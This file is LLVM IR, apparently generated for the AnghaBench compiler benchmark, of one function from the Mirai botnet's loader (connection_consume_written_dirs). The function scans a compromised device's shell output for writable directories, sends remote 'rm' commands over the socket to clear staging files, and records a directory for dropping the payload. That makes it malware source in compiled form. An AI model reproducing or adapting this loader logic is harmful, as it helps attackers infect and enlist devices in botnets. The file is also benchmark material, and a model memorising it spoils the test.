; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_connection.c_connection_consume_written_dirs.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_connection.c_connection_consume_written_dirs.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.connection = type { i32, %struct.TYPE_2__, i32, i64 }
%struct.TYPE_2__ = type { i32 }

@FALSE = common dso_local global i64 0, align 8
@TOKEN_RESPONSE = common dso_local global i8* null, align 8
@TRUE = common dso_local global i64 0, align 8
@VERIFY_STRING_CHECK = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.1 = private unnamed_addr constant [36 x i8] c"rm %s/.t; rm %s/.sh; rm %s/.human\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @connection_consume_written_dirs(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %7, align 4
  %11 = load i64, i64* @FALSE, align 8
  store i64 %11, i64* %8, align 8
  %12 = load %struct.connection*, %struct.connection** %3, align 8
  %13 = getelementptr inbounds %struct.connection, %struct.connection* %12, i32 0, i32 3
  %14 = load i64, i64* %13, align 8
  %15 = load %struct.connection*, %struct.connection** %3, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 0
  %17 = load i32, i32* %16, align 8
  %18 = load i8*, i8** @TOKEN_RESPONSE, align 8
  %19 = load i8*, i8** @TOKEN_RESPONSE, align 8
  %20 = call i32 @strlen(i8* %19)
  %21 = call i32 @util_memsearch(i64 %14, i32 %17, i8* %18, i32 %20)
  store i32 %21, i32* %4, align 4
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %24

23:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %104

24:                                               ; preds = %1
  br label %25

25:                                               ; preds = %101, %58, %24
  %26 = load i64, i64* @TRUE, align 8
  %27 = icmp ne i64 %26, 0
  br i1 %27, label %28, label %102

28:                                               ; preds = %25
  %29 = load %struct.connection*, %struct.connection** %3, align 8
  %30 = getelementptr inbounds %struct.connection, %struct.connection* %29, i32 0, i32 3
  %31 = load i64, i64* %30, align 8
  %32 = load i32, i32* %7, align 4
  %33 = sext i32 %32 to i64
  %34 = add nsw i64 %31, %33
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %7, align 4
  %37 = sub nsw i32 %35, %36
  %38 = load i8*, i8** @VERIFY_STRING_CHECK, align 8
  %39 = load i8*, i8** @VERIFY_STRING_CHECK, align 8
  %40 = call i32 @strlen(i8* %39)
  %41 = call i32 @util_memsearch(i64 %34, i32 %37, i8* %38, i32 %40)
  store i32 %41, i32* %6, align 4
  %42 = load i32, i32* %6, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

44:                                               ; preds = %28
  br label %102

45:                                               ; preds = %28
  %46 = load i32, i32* %6, align 4
  %47 = load i32, i32* %7, align 4
  %48 = add nsw i32 %47, %46
  store i32 %48, i32* %7, align 4
  %49 = load %struct.connection*, %struct.connection** %3, align 8
  %50 = getelementptr inbounds %struct.connection, %struct.connection* %49, i32 0, i32 3
  %51 = load i64, i64* %50, align 8
  %52 = load i32, i32* %7, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = call i8* @strtok(i64 %54, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  store i8* %55, i8** %9, align 8
  %56 = load i8*, i8** %9, align 8
  %57 = icmp eq i8* %56, null
  br i1 %57, label %58, label %59

58:                                               ; preds = %45
  br label %25

59:                                               ; preds = %45
  %60 = load i8*, i8** %9, align 8
  %61 = call i32 @strlen(i8* %60)
  store i32 %61, i32* %10, align 4
  %62 = load i8*, i8** %9, align 8
  %63 = load i32, i32* %10, align 4
  %64 = sub nsw i32 %63, 1
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 13
  br i1 %69, label %70, label %76

70:                                               ; preds = %59
  %71 = load i8*, i8** %9, align 8
  %72 = load i32, i32* %10, align 4
  %73 = sub nsw i32 %72, 1
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8, i8* %71, i64 %74
  store i8 0, i8* %75, align 1
  br label %76

76:                                               ; preds = %70, %59
  %77 = load %struct.connection*, %struct.connection** %3, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 2
  %79 = load i32, i32* %78, align 8
  %80 = load i8*, i8** %9, align 8
  %81 = load i8*, i8** %9, align 8
  %82 = load i8*, i8** %9, align 8
  %83 = call i32 @util_sockprintf(i32 %79, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0), i8* %80, i8* %81, i8* %82)
  %84 = load i64, i64* %8, align 8
  %85 = icmp ne i64 %84, 0
  br i1 %85, label %101, label %86

86:                                               ; preds = %76
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 31
  br i1 %88, label %89, label %97

89:                                               ; preds = %86
  %90 = load %struct.connection*, %struct.connection** %3, align 8
  %91 = getelementptr inbounds %struct.connection, %struct.connection* %90, i32 0, i32 1
  %92 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %91, i32 0, i32 0
  %93 = load i32, i32* %92, align 4
  %94 = load i8*, i8** %9, align 8
  %95 = call i32 @strcpy(i32 %93, i8* %94)
  %96 = load i64, i64* @TRUE, align 8
  store i64 %96, i64* %8, align 8
  br label %100

97:                                               ; preds = %86
  %98 = load %struct.connection*, %struct.connection** %3, align 8
  %99 = call i32 @connection_close(%struct.connection* %98)
  br label %100

100:                                              ; preds = %97, %89
  br label %101

101:                                              ; preds = %100, %76
  br label %25

102:                                              ; preds = %44, %25
  %103 = load i32, i32* %4, align 4
  store i32 %103, i32* %2, align 4
  br label %104

104:                                              ; preds = %102, %23
  %105 = load i32, i32* %2, align 4
  ret i32 %105
}

declare dso_local i32 @util_memsearch(i64, i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i8* @strtok(i64, i8*) #1

declare dso_local i32 @util_sockprintf(i32, i8*, i8*, i8*, i8*) #1

declare dso_local i32 @strcpy(i32, i8*) #1

declare dso_local i32 @connection_close(%struct.connection*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
